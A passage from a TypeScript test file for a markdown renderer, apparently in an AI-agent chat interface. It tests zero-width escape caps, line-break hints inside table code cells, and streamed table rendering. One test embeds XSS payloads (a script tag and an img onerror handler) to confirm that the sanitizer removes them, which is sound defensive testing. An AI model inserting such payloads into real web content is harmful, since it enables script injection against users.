    expect(renderMarkdownRevealed(`# Plan\n\n${"a&#x200b;".repeat(MAX_PROSE_ESCAPES + 1)}`) === null, "past the cap").toBe(true);
    expect(escapesIn(renderMarkdownRevealed(`# Plan\n\n${"a&#x200b;".repeat(3)}`))).toHaveLength(3);
  });
});

describe("renderMarkdown: code in a table cell", () => {
  const owner = "| 想了解 | 从这里读 |\n|---|---|\n| Agent 对话怎么跑 | `agent/src/providers/{claude_sidecar,codex,acp}/` |";

  it("may break after a slash, and after a comma inside braces, and its text stays the same", () => {
    const html = renderMarkdown(owner);
    expect(html).toContain("<code>agent/<wbr>src/<wbr>providers/<wbr>{claude_sidecar,<wbr>codex,<wbr>acp}/</code>");
    const box = document.createElement("div");
    box.innerHTML = html;
    expect(box.querySelector("code")!.textContent).toBe("agent/src/providers/{claude_sidecar,codex,acp}/");
  });

  it("adds no break to code outside a table or to a fenced block, and none shows in a reply's own text", () => {
    expect(renderMarkdown("see `agent/src/x` here")).not.toContain("<wbr>");
    expect(renderMarkdown("```\nagent/src/x\n```")).not.toContain("<wbr>");
    expect(renderMarkdown("| a |\n|---|\n| agent/src/x |")).not.toContain("<wbr>");
  });

  it("keeps the sanitizer's allowed tags: the break is the only element added, and a reply's markup still goes", () => {
    const html = renderMarkdown("| a |\n|---|\n| `x/y` <script>alert(1)</script><img src=x onerror=alert(1)> |");
    expect(html).not.toMatch(/<script|<img|onerror/);
    expect(html.match(/<wbr>/g)).toHaveLength(1);
  });

  it("a streamed table draws the same HTML as one rendering", () => {
    const text = "intro\n\n" + owner + "\n\nafter\n";
    const whole = renderMarkdown(text);
    let held: StreamedMarkdown | null = null;
    let settled = "";
    for (let at = 0; at <= text.length; at += 7) {
      held = streamMarkdown(held, text.slice(0, at));
      settled = (held.restarted ? "" : settled) + held.added;
    }
    held = streamMarkdown(held, text);
    settled = (held.restarted ? "" : settled) + held.added;
    expect(settled + held.tail).toBe(whole);
  });
});
